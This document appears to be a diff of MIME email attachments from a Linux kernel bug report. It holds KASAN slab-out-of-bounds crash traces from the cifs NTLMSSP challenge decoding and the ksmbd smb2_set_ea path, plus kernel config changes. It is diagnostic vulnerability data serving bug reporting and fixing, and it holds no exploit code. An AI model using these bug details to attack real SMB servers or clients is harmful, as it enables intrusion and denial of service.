+[  106.524771]  ? print_report+0x2ef/0x630
+[  106.525008]  check_panic_on_warn+0x91/0xa0
+[  106.525257]  end_report+0xc8/0xe0
+[  106.525471]  kasan_report+0xdc/0x100
+[  106.525708]  ? string+0x42b/0x470
+[  106.525926]  string+0x42b/0x470
+[  106.526131]  ? __pfx_string+0x10/0x10
+[  106.526360]  vsnprintf+0x330/0x1110
+[  106.526595]  ? __pfx_vsnprintf+0x10/0x10
+[  106.526832]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[  106.527124]  vprintk_store+0x319/0x960
+[  106.527350]  ? stack_depot_save_flags+0x480/0x820
+[  106.527638]  ? __pfx_vprintk_store+0x10/0x10
+[  106.527885]  ? kasan_save_stack+0x42/0x60
+[  106.528114]  ? kasan_save_track+0x14/0x30
+[  106.528343]  ? smb2_set_info+0x1eff/0x3a50
+[  106.528593]  ? handle_ksmbd_work+0x6e4/0x1dd0
+[  106.528858]  ? process_one_work+0x755/0x1200
+[  106.529101]  ? worker_thread+0x4d3/0xbc0
+[  106.529330]  ? kthread+0x2fe/0x400
+[  106.529567]  ? printk_percpu_data_ready+0xe/0x20
+[  106.529828]  vprintk_emit+0xfc/0x3b0
+[  106.530056]  ? __pfx_vprintk_emit+0x10/0x10
+[  106.530309]  _printk+0xcc/0x100
+[  106.530547]  ? __pfx__printk+0x10/0x10
+[  106.530798]  ? __kasan_kmalloc+0x8f/0xa0
+[  106.531026]  ? __kmalloc_cache_noprof+0x19f/0x3f0
+[  106.531296]  ? __kasan_kmalloc+0x8f/0xa0
+[  106.531528]  smb2_set_ea+0x5a9/0x7f0
+[  106.531746]  ? smb2_set_info+0x160f/0x3a50
+[  106.531990]  smb2_set_info+0x1eff/0x3a50
+[  106.532229]  ? _raw_spin_lock+0x85/0xe0
+[  106.532475]  ? __pfx_smb2_set_info+0x10/0x10
+[  106.532745]  ? ksmbd_smb2_check_message+0x531/0x2cd0
+[  106.533058]  ? __pfx_smb2_set_info+0x10/0x10
+[  106.533315]  handle_ksmbd_work+0x6e4/0x1dd0
+[  106.533604]  process_one_work+0x755/0x1200
+[  106.533865]  ? __pfx_process_one_work+0x10/0x10
+[  106.534132]  ? __pfx_handle_ksmbd_work+0x10/0x10
+[  106.534415]  worker_thread+0x4d3/0xbc0
+[  106.534676]  ? __pfx_worker_thread+0x10/0x10
+[  106.534934]  kthread+0x2fe/0x400
+[  106.535200]  ? recalc_sigpending+0x18c/0x220
+[  106.535528]  ? __pfx_kthread+0x10/0x10
+[  106.535762]  ret_from_fork+0x3f7/0x680
+[  106.535998]  ? __pfx_ret_from_fork+0x10/0x10
+[  106.536252]  ? __switch_to+0x743/0xf60
+[  106.536515]  ? __pfx_kthread+0x10/0x10
+[  106.536751]  ret_from_fork_asm+0x1a/0x30
+[  106.537014]  </TASK>
+[  106.537794] Kernel Offset: disabled
+[  106.538562] Rebooting in 1 seconds..
 
---===============1188433712424754634==
+--===============3053206820710942250==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 Content-Disposition: attachment; filename="kasan-run2.txt"
 MIME-Version: 1.0
 
-[   23.309944] BUG: KASAN: slab-out-of-bounds in string+0x42b/0x470
-[   23.310464] Read of size 1 at addr ffff88800e46c0cc by task cifs_ntlmssp_s=
-i/102
-[   23.310615]=20
-[   23.311136] CPU: 1 UID: 0 PID: 102 Comm: cifs_ntlmssp_si Not tainted 7.3.0=
- #8 PREEMPT(lazy)=20
-[   23.311278] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
+[  106.652767] BUG: KASAN: slab-out-of-bounds in string+0x42b/0x470
+[  106.653256] Read of size 1 at addr ffff88800e4ec6e5 by task kworker/0:0/9
+[  106.653391]=20
+[  106.653959] CPU: 0 UID: 0 PID: 9 Comm: kworker/0:0 Not tainted 7.3.0 #8 PR=
+EEMPT(lazy)=20
+[  106.654097] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
 ps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[   23.311533] Call Trace:
-[   23.311625]  <TASK>
-[   23.311730]  dump_stack_lvl+0x7b/0xa0
-[   23.311886]  print_report+0xd0/0x630
-[   23.311975]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
-[   23.312064]  ? __kernel_text_address+0x12/0x40
-[   23.312143]  ? string+0x42b/0x470
-[   23.312196]  kasan_report+0xce/0x100
-[   23.312263]  ? string+0x42b/0x470
-[   23.312328]  string+0x42b/0x470
-[   23.312387]  ? __pfx_string+0x10/0x10
-[   23.312446]  ? mempool_free+0xd4/0x120
-[   23.312514]  vsnprintf+0x330/0x1110
-[   23.312579]  ? cifs_mount_get_session+0x15/0x430
-[   23.312662]  ? __pfx_vsnprintf+0x10/0x10
-[   23.312721]  ? path_mount+0x571/0x1e30
-[   23.312784]  ? do_syscall_64+0xdd/0x4a0
-[   23.312856]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   23.312927]  vprintk_store+0x319/0x960
-[   23.313008]  ? __pfx_vprintk_store+0x10/0x10
-[   23.313094]  ? kmem_cache_free+0xe2/0x430
-[   23.313176]  ? __pfx_clockevents_program_event+0x10/0x10
-[   23.313262]  ? printk_percpu_data_ready+0xe/0x20
-[   23.313329]  vprintk_emit+0xfc/0x3b0
-[   23.313398]  ? __pfx_vprintk_emit+0x10/0x10
-[   23.313467]  ? _raw_spin_trylock+0xb5/0x120
-[   23.313546]  _printk+0xcc/0x100
-[   23.313637]  ? __pfx__printk+0x10/0x10
-[   23.313727]  ? __pfx____ratelimit+0x10/0x10
-[   23.313797]  decode_ntlmssp_challenge+0x6fa/0x880
-[   23.313904]  ? build_ntlmssp_smb3_negotiate_blob+0x3f8/0x5b0
-[   23.313996]  SMB2_sess_auth_rawntlmssp_negotiate+0x7c5/0xdc0
-[   23.314121]  ? __pfx_SMB2_sess_auth_rawntlmssp_negotiate+0x10/0x10
-[   23.314234]  ? kasan_save_track+0x14/0x30
-[   23.314320]  ? __kasan_kmalloc+0x8f/0xa0
-[   23.314384]  ? __kmalloc_cache_noprof+0x19f/0x3f0
-[   23.314455]  ? SMB2_sess_setup+0x67/0x650
-[   23.314526]  ? __pfx_SMB2_sess_auth_rawntlmssp_negotiate+0x10/0x10
-[   23.314614]  SMB2_sess_setup+0x28a/0x650
-[   23.314686]  ? __pfx_SMB2_sess_setup+0x10/0x10
-[   23.314758]  cifs_setup_session+0x280/0xe60
-[   23.314829]  cifs_get_smb_ses+0x1132/0x19f0
-[   23.314909]  cifs_mount_get_session+0xa2/0x430
-[   23.314977]  cifs_mount+0xc1/0xc00
-[   23.315043]  ? __pfx_cifs_mount+0x10/0x10
-[   23.315103]  ? smb3_update_mnt_flags+0x550/0x790
-[   23.315198]  cifs_smb3_do_mount+0x286/0x1780
-[   23.315285]  ? __pfx_cifs_smb3_do_mount+0x10/0x10
-[   23.315365]  ? mutex_lock+0x86/0xe0
-[   23.315420]  ? __pfx_mutex_lock+0x10/0x10
-[   23.315475]  ? smb3_handle_conflicting_options+0x43e/0xba0
-[   23.315551]  smb3_get_tree+0x1a2/0x3d0
-[   23.315619]  vfs_get_tree+0x8d/0x300
-[   23.315694]  fc_mount+0x1d/0x1f0
-[   23.315769]  path_mount+0x571/0x1e30
-[   23.315879]  ? __pfx_path_mount+0x10/0x10
-[   23.315973]  ? kasan_save_track+0x14/0x30
-[   23.316071]  ? kmem_cache_free+0xe2/0x430
-[   23.316212]  ? putname+0x93/0xe0
-[   23.316319]  __x64_sys_mount+0x24b/0x2d0
-[   23.316430]  ? __pfx___x64_sys_mount+0x10/0x10
-[   23.316554]  do_syscall_64+0xdd/0x4a0
-[   23.316669]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   23.316884] RIP: 0033:0x41c87e
-[   23.317460] Code: c7 05 fe 87 09 00 00 00 00 00 eb 98 e8 1b 07 00 00 66 2e=
- 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 49 89 ca b8 a5 00 00 00 0f 05 <48> 3d=
- 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
-[   23.317587] RSP: 002b:00007fff23b0c888 EFLAGS: 00000246 ORIG_RAX: 00000000=
-000000a5
-[   23.317744] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 000000000041c=
-87e
-[   23.317811] RDX: 000000000048809f RSI: 0000000000488084 RDI: 0000000000488=
-0a4
-[   23.317889] RBP: 0000000000000000 R08: 00007fff23b0c8f0 R09: 00000000004bb=
-160
-[   23.317957] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000488=
-084
-[   23.318027] R13: 00007fff23b0ca98 R14: 00000000004af828 R15: 0000000000000=
-001
-[   23.318121]  </TASK>
-[   23.318206]=20
-[   23.318241] Allocated by task 103:
-[   23.318355]  kasan_save_stack+0x33/0x60
-[   23.318457]  kasan_save_track+0x14/0x30
-[   23.318511]  __kasan_slab_alloc+0x6e/0x70
-[   23.318565]  kmem_cache_alloc_noprof+0x149/0x3e0
-[   23.318639]  mempool_alloc_noprof+0x128/0x210
-[   23.318695]  cifs_buf_get+0x3b/0xa0
-[   23.318755]  allocate_buffers+0x209/0x380
-[   23.318830]  cifs_demultiplex_thread+0x1f2/0x2220
-[   23.318888]  kthread+0x2fe/0x400
-[   23.318940]  ret_from_fork+0x3f7/0x680
-[   23.319000]  ret_from_fork_asm+0x1a/0x30
-[   23.319078]=20
-[   23.319135] The buggy address belongs to the object at ffff88800e468000
-[   23.319135]  which belongs to the cache cifs_request of size 16588
-[   23.319222] The buggy address is located 0 bytes to the right of
-[   23.319222]  allocated 16588-byte region [ffff88800e468000, ffff88800e46c0=
-cc)
-[   23.319286]=20
-[   23.319364] The buggy address belongs to the physical page:
-[   23.319788] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0=
- pfn:0xe468
-[   23.320138] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 p=
-incount:0
-[   23.320244] flags: 0x100000000000040(head|node=3D0|zone=3D1)
-[   23.320743] page_type: f5(slab)
-[   23.320937] raw: 0100000000000040 ffff88800b7743c0 dead000000000122 000000=
+[  106.654323] Workqueue: ksmbd-io handle_ksmbd_work
+[  106.654644] Call Trace:
+[  106.654728]  <TASK>
+[  106.654859]  dump_stack_lvl+0x7b/0xa0
+[  106.655014]  print_report+0xd0/0x630
+[  106.655102]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[  106.655203]  ? string+0x42b/0x470
+[  106.655260]  kasan_report+0xce/0x100
+[  106.655332]  ? string+0x42b/0x470
+[  106.655402]  string+0x42b/0x470
+[  106.655464]  ? __pfx_string+0x10/0x10
+[  106.655534]  vsnprintf+0x330/0x1110
+[  106.655606]  ? __pfx_vsnprintf+0x10/0x10
+[  106.655672]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[  106.655762]  vprintk_store+0x319/0x960
+[  106.655836]  ? stack_depot_save_flags+0x480/0x820
+[  106.655939]  ? __pfx_vprintk_store+0x10/0x10
+[  106.656006]  ? kasan_save_stack+0x42/0x60
+[  106.656091]  ? kasan_save_track+0x14/0x30
+[  106.656158]  ? smb2_set_info+0x1eff/0x3a50
+[  106.656230]  ? handle_ksmbd_work+0x6e4/0x1dd0
+[  106.656313]  ? process_one_work+0x755/0x1200
+[  106.656387]  ? worker_thread+0x4d3/0xbc0
+[  106.656455]  ? kthread+0x2fe/0x400
+[  106.656534]  ? printk_percpu_data_ready+0xe/0x20
+[  106.656605]  vprintk_emit+0xfc/0x3b0
+[  106.656678]  ? __pfx_vprintk_emit+0x10/0x10
+[  106.656760]  _printk+0xcc/0x100
+[  106.656848]  ? __pfx__printk+0x10/0x10
+[  106.656939]  ? __kasan_kmalloc+0x8f/0xa0
+[  106.657000]  ? __kmalloc_cache_noprof+0x19f/0x3f0
+[  106.657081]  ? __kasan_kmalloc+0x8f/0xa0
+[  106.657141]  smb2_set_ea+0x5a9/0x7f0
+[  106.657210]  smb2_set_info+0x1eff/0x3a50
+[  106.657285]  ? _raw_spin_lock+0x85/0xe0
+[  106.657365]  ? __pfx_smb2_set_info+0x10/0x10
+[  106.657443]  ? ksmbd_smb2_check_message+0x531/0x2cd0
+[  106.657538]  ? __pfx_smb2_set_info+0x10/0x10
+[  106.657608]  handle_ksmbd_work+0x6e4/0x1dd0
+[  106.657707]  process_one_work+0x755/0x1200
+[  106.657789]  ? __pfx_process_one_work+0x10/0x10
+[  106.657869]  ? __pfx_handle_ksmbd_work+0x10/0x10
+[  106.657959]  worker_thread+0x4d3/0xbc0
+[  106.658045]  ? __pfx_worker_thread+0x10/0x10
+[  106.658115]  kthread+0x2fe/0x400
+[  106.658174]  ? recalc_sigpending+0x18c/0x220
+[  106.658245]  ? __pfx_kthread+0x10/0x10
+[  106.658309]  ret_from_fork+0x3f7/0x680
+[  106.658383]  ? __pfx_ret_from_fork+0x10/0x10
+[  106.658454]  ? __switch_to+0x743/0xf60
+[  106.658539]  ? __pfx_kthread+0x10/0x10
+[  106.658604]  ret_from_fork_asm+0x1a/0x30
+[  106.658721]  </TASK>
+[  106.680431]=20
+[  106.680502] Allocated by task 102:
+[  106.680641]  kasan_save_stack+0x33/0x60
+[  106.680862]  kasan_save_track+0x14/0x30
+[  106.680925]  __kasan_kmalloc+0x8f/0xa0
+[  106.680982]  __kvmalloc_node_noprof+0x24a/0x670
+[  106.681068]  ksmbd_conn_handler_loop+0x530/0x1110
+[  106.681145]  kthread+0x2fe/0x400
+[  106.681201]  ret_from_fork+0x3f7/0x680
+[  106.681262]  ret_from_fork_asm+0x1a/0x30
+[  106.681346]=20
+[  106.681404] The buggy address belongs to the object at ffff88800e4ec600
+[  106.681404]  which belongs to the cache kmalloc-256 of size 256
+[  106.681490] The buggy address is located 0 bytes to the right of
+[  106.681490]  allocated 229-byte region [ffff88800e4ec600, ffff88800e4ec6e5)
+[  106.681558]=20
+[  106.681633] The buggy address belongs to the physical page:
+[  106.682002] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0=
+ pfn:0xe4ec
+[  106.682284] flags: 0x100000000000000(node=3D0|zone=3D1)
+[  106.682683] page_type: f5(slab)
+[  106.683082] raw: 0100000000000000 ffff88800a041b40 dead000000000122 000000=
 0000000000
-[   23.321000] raw: 0000000000000000 0000000200010001 00000000f5000000 000000=
+[  106.683159] raw: 0000000000000000 0000000000080008 00000000f5000000 000000=
 0000000000
-[   23.321079] head: 0100000000000040 ffff88800b7743c0 dead000000000122 00000=
-00000000000
-[   23.321134] head: 0000000000000000 0000000200010001 00000000f5000000 00000=
-00000000000
-[   23.321189] head: 0100000000000003 fffffffffffffe01 00000000ffffffff 00000=
-000ffffffff
-[   23.321242] head: 0000000000000000 0000000000000000 00000000ffffffff 00000=
-00000000008
-[   23.321312] page dumped because: kasan: bad access detected
-[   23.321346]=20
-[   23.321365] Memory state around the buggy address:
-[   23.321610]  ffff88800e46bf80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
+[  106.683262] page dumped because: kasan: bad access detected
+[  106.683297]=20
+[  106.683319] Memory state around the buggy address:
+[  106.683570]  ffff88800e4ec580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
+c fc
+[  106.683643]  ffff88800e4ec600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
 0 00
-[   23.321680]  ffff88800e46c000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
-0 00
-[   23.321738] >ffff88800e46c080: 00 00 00 00 00 00 00 00 00 04 fc fc fc fc f=
+[  106.683703] >ffff88800e4ec680: 00 00 00 00 00 00 00 00 00 00 00 00 05 fc f=
 c fc
-[   23.321786]                                               ^
-[   23.321880]  ffff88800e46c100: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
+[  106.683753]                                                        ^
+[  106.683838]  ffff88800e4ec700: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
 c fc
-[   23.321924]  ffff88800e46c180: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
+[  106.683886]  ffff88800e4ec780: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
 c fc
-[   23.321976] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+[  106.683941] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-[   23.322332] Kernel panic - not syncing: KASAN: panic_on_warn set ...
-[   23.346361] CPU: 1 UID: 0 PID: 102 Comm: cifs_ntlmssp_si Not tainted 7.3.0=
- #8 PREEMPT(lazy)=20
-[   23.346849] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
+[  106.684295] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+[  106.701346] CPU: 0 UID: 0 PID: 9 Comm: kworker/0:0 Not tainted 7.3.0 #8 PR=
+EEMPT(lazy)=20
+[  106.701756] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
 ps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[   23.347342] Call Trace:
-[   23.347529]  <TASK>
-[   23.347681]  dump_stack_lvl+0x30/0xa0
-[   23.347961]  vpanic+0x790/0x850
-[   23.348201]  ? __pfx_vpanic+0x10/0x10
-[   23.348486]  ? string+0x42b/0x470
-[   23.348709]  panic+0xcf/0xd0
-[   23.348936]  ? __pfx_panic+0x10/0x10
-[   23.349183]  ? print_report+0x2ef/0x630
-[   23.349426]  check_panic_on_warn+0x91/0xa0
-[   23.349682]  end_report+0xc8/0xe0
-[   23.349918]  kasan_report+0xdc/0x100
-[   23.350153]  ? string+0x42b/0x470
-[   23.350394]  string+0x42b/0x470
-[   23.350611]  ? __pfx_string+0x10/0x10
-[   23.350838]  ? mempool_free+0xd4/0x120
-[   23.351083]  vsnprintf+0x330/0x1110
-[   23.351313]  ? cifs_mount_get_session+0x15/0x430
-[   23.351582]  ? __pfx_vsnprintf+0x10/0x10
-[   23.351815]  ? path_mount+0x571/0x1e30
-[   23.352054]  ? do_syscall_64+0xdd/0x4a0
-[   23.352291]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   23.352574]  vprintk_store+0x319/0x960
-[   23.352819]  ? __pfx_vprintk_store+0x10/0x10
-[   23.353109]  ? kmem_cache_free+0xe2/0x430
-[   23.353368]  ? __pfx_clockevents_program_event+0x10/0x10
-[   23.353668]  ? printk_percpu_data_ready+0xe/0x20
-[   23.353948]  vprintk_emit+0xfc/0x3b0
-[   23.354185]  ? __pfx_vprintk_emit+0x10/0x10
-[   23.354439]  ? _raw_spin_trylock+0xb5/0x120
-[   23.354702]  _printk+0xcc/0x100
-[   23.354950]  ? __pfx__printk+0x10/0x10
-[   23.355213]  ? __pfx____ratelimit+0x10/0x10
-[   23.355464]  decode_ntlmssp_challenge+0x6fa/0x880
-[   23.355732]  ? build_ntlmssp_smb3_negotiate_blob+0x3f8/0x5b0
-[   23.356046]  SMB2_sess_auth_rawntlmssp_negotiate+0x7c5/0xdc0
-[   23.356363]  ? __pfx_SMB2_sess_auth_rawntlmssp_negotiate+0x10/0x10
-[   23.356688]  ? kasan_save_track+0x14/0x30
-[   23.356933]  ? __kasan_kmalloc+0x8f/0xa0
-[   23.357168]  ? __kmalloc_cache_noprof+0x19f/0x3f0
-[   23.357439]  ? SMB2_sess_setup+0x67/0x650
-[   23.357688]  ? __pfx_SMB2_sess_auth_rawntlmssp_negotiate+0x10/0x10
-[   23.358028]  SMB2_sess_setup+0x28a/0x650
-[   23.358279]  ? __pfx_SMB2_sess_setup+0x10/0x10
-[   23.358545]  cifs_setup_session+0x280/0xe60
-[   23.358800]  cifs_get_smb_ses+0x1132/0x19f0
-[   23.359071]  cifs_mount_get_session+0xa2/0x430
-[   23.359338]  cifs_mount+0xc1/0xc00
-[   23.359566]  ? __pfx_cifs_mount+0x10/0x10
-[   23.359806]  ? smb3_update_mnt_flags+0x550/0x790
-[   23.360100]  cifs_smb3_do_mount+0x286/0x1780
-[   23.360376]  ? __pfx_cifs_smb3_do_mount+0x10/0x10
-[   23.360657]  ? mutex_lock+0x86/0xe0
-[   23.360882]  ? __pfx_mutex_lock+0x10/0x10
-[   23.361115]  ? smb3_handle_conflicting_options+0x43e/0xba0
-[   23.361414]  smb3_get_tree+0x1a2/0x3d0
-[   23.361656]  vfs_get_tree+0x8d/0x300
-[   23.361916]  fc_mount+0x1d/0x1f0
-[   23.362255]  path_mount+0x571/0x1e30
-[   23.362532]  ? __pfx_path_mount+0x10/0x10
-[   23.362774]  ? kasan_save_track+0x14/0x30
-[   23.363030]  ? kmem_cache_free+0xe2/0x430
-[   23.363297]  ? putname+0x93/0xe0
-[   23.363525]  __x64_sys_mount+0x24b/0x2d0
-[   23.363824]  ? __pfx___x64_sys_mount+0x10/0x10
-[   23.364115]  do_syscall_64+0xdd/0x4a0
-[   23.364359]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   23.364638] RIP: 0033:0x41c87e
-[   23.364857] Code: c7 05 fe 87 09 00 00 00 00 00 eb 98 e8 1b 07 00 00 66 2e=
- 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 49 89 ca b8 a5 00 00 00 0f 05 <48> 3d=
- 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
-[   23.365578] RSP: 002b:00007fff23b0c888 EFLAGS: 00000246 ORIG_RAX: 00000000=
-000000a5
-[   23.365968] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 000000000041c=
-87e
-[   23.366298] RDX: 000000000048809f RSI: 0000000000488084 RDI: 0000000000488=
-0a4
-[   23.366614] RBP: 0000000000000000 R08: 00007fff23b0c8f0 R09: 00000000004bb=
-160
-[   23.366936] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000488=
-084
-[   23.367255] R13: 00007fff23b0ca98 R14: 00000000004af828 R15: 0000000000000=
-001
-[   23.367590]  </TASK>
-[   23.368892] Kernel Offset: disabled
-[   23.369690] Rebooting in 1 seconds..
+[  106.702250] Workqueue: ksmbd-io handle_ksmbd_work
+[  106.702598] Call Trace:
+[  106.702762]  <TASK>
+[  106.702919]  dump_stack_lvl+0x30/0xa0
+[  106.703171]  vpanic+0x790/0x850
+[  106.703408]  ? __pfx_vpanic+0x10/0x10
+[  106.703658]  ? string+0x42b/0x470
+[  106.703880]  panic+0xcf/0xd0
+[  106.704099]  ? __pfx_panic+0x10/0x10
+[  106.704345]  ? print_report+0x2ef/0x630
+[  106.704588]  check_panic_on_warn+0x91/0xa0
+[  106.704851]  end_report+0xc8/0xe0
+[  106.705081]  kasan_report+0xdc/0x100
+[  106.705371]  ? string+0x42b/0x470
+[  106.705605]  string+0x42b/0x470
+[  106.705818]  ? __pfx_string+0x10/0x10
+[  106.706073]  vsnprintf+0x330/0x1110
+[  106.706310]  ? __pfx_vsnprintf+0x10/0x10
+[  106.706550]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[  106.706855]  vprintk_store+0x319/0x960
+[  106.707096]  ? stack_depot_save_flags+0x480/0x820
+[  106.707387]  ? __pfx_vprintk_store+0x10/0x10
+[  106.707637]  ? kasan_save_stack+0x42/0x60
+[  106.707879]  ? kasan_save_track+0x14/0x30
+[  106.708119]  ? smb2_set_info+0x1eff/0x3a50
+[  106.708368]  ? handle_ksmbd_work+0x6e4/0x1dd0
+[  106.708637]  ? process_one_work+0x755/0x1200
+[  106.708901]  ? worker_thread+0x4d3/0xbc0
+[  106.709141]  ? kthread+0x2fe/0x400
+[  106.709375]  ? printk_percpu_data_ready+0xe/0x20
+[  106.709641]  vprintk_emit+0xfc/0x3b0
+[  106.709882]  ? __pfx_vprintk_emit+0x10/0x10
+[  106.710148]  _printk+0xcc/0x100
+[  106.710383]  ? __pfx__printk+0x10/0x10
+[  106.710640]  ? __kasan_kmalloc+0x8f/0xa0
+[  106.710878]  ? __kmalloc_cache_noprof+0x19f/0x3f0
+[  106.711158]  ? __kasan_kmalloc+0x8f/0xa0
+[  106.711392]  smb2_set_ea+0x5a9/0x7f0
+[  106.711623]  smb2_set_info+0x1eff/0x3a50
+[  106.711877]  ? _raw_spin_lock+0x85/0xe0
+[  106.712132]  ? __pfx_smb2_set_info+0x10/0x10
+[  106.712396]  ? ksmbd_smb2_check_message+0x531/0x2cd0
+[  106.712697]  ? __pfx_smb2_set_info+0x10/0x10
+[  106.712964]  handle_ksmbd_work+0x6e4/0x1dd0
+[  106.713248]  process_one_work+0x755/0x1200
+[  106.713513]  ? __pfx_process_one_work+0x10/0x10
+[  106.713787]  ? __pfx_handle_ksmbd_work+0x10/0x10
+[  106.714081]  worker_thread+0x4d3/0xbc0
+[  106.714337]  ? __pfx_worker_thread+0x10/0x10
+[  106.714601]  kthread+0x2fe/0x400
+[  106.714814]  ? recalc_sigpending+0x18c/0x220
+[  106.715076]  ? __pfx_kthread+0x10/0x10
+[  106.715309]  ret_from_fork+0x3f7/0x680
+[  106.715547]  ? __pfx_ret_from_fork+0x10/0x10
+[  106.715806]  ? __switch_to+0x743/0xf60
+[  106.716067]  ? __pfx_kthread+0x10/0x10
+[  106.716299]  ret_from_fork_asm+0x1a/0x30
+[  106.716565]  </TASK>
+[  106.717364] Kernel Offset: disabled
+[  106.718137] Rebooting in 1 seconds..
 
---===============1188433712424754634==
+--===============3053206820710942250==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 Content-Disposition: attachment; filename="config"
@@ -942,7 +1594,7 @@ MIME-Version: 1.0
 # Automatically generated file; DO NOT EDIT.
 # Linux/x86 7.3.0 Kernel Configuration
 #
-CONFIG_CC_VERSION_TEXT=3D"gcc (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0"
+CONFIG_CC_VERSION_TEXT=3D"gcc (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0"
 CONFIG_CC_IS_GCC=3Dy
 CONFIG_GCC_VERSION=3D130300
 CONFIG_CLANG_VERSION=3D0
@@ -962,7 +1614,7 @@ CONFIG_CC_HAS_ASM_INLINE=3Dy
 CONFIG_CC_HAS_ASSUME=3Dy
 CONFIG_CC_HAS_NO_PROFILE_FN_ATTR=3Dy
 CONFIG_LD_CAN_USE_KEEP_IN_OVERLAY=3Dy
-CONFIG_PAHOLE_VERSION=3D0
+CONFIG_PAHOLE_VERSION=3D125
 CONFIG_CONSTRUCTORS=3Dy
 CONFIG_IRQ_WORK=3Dy
 CONFIG_BUILDTIME_TABLE_SORT=3Dy
@@ -6439,6 +7091,8 @@ CONFIG_DEBUG_INFO_COMPRESSED_NONE=3Dy
 # CONFIG_DEBUG_INFO_COMPRESSED_ZLIB is not set
 # CONFIG_DEBUG_INFO_COMPRESSED_ZSTD is not set
 # CONFIG_DEBUG_INFO_SPLIT is not set
+# CONFIG_DEBUG_INFO_BTF is not set
+CONFIG_PAHOLE_HAS_LANG_EXCLUDE=3Dy
 # CONFIG_GDB_SCRIPTS is not set
 CONFIG_FRAME_WARN=3D2048
 # CONFIG_STRIP_ASM_SYMS is not set
@@ -6793,4 +7447,4 @@ CONFIG_ARCH_USE_MEMTEST=3Dy
 CONFIG_IO_URING_ZCRX=3Dy
 CONFIG_IO_URING_BPF=3Dy
 
---===============1188433712424754634==--
+--===============3053206820710942250==--
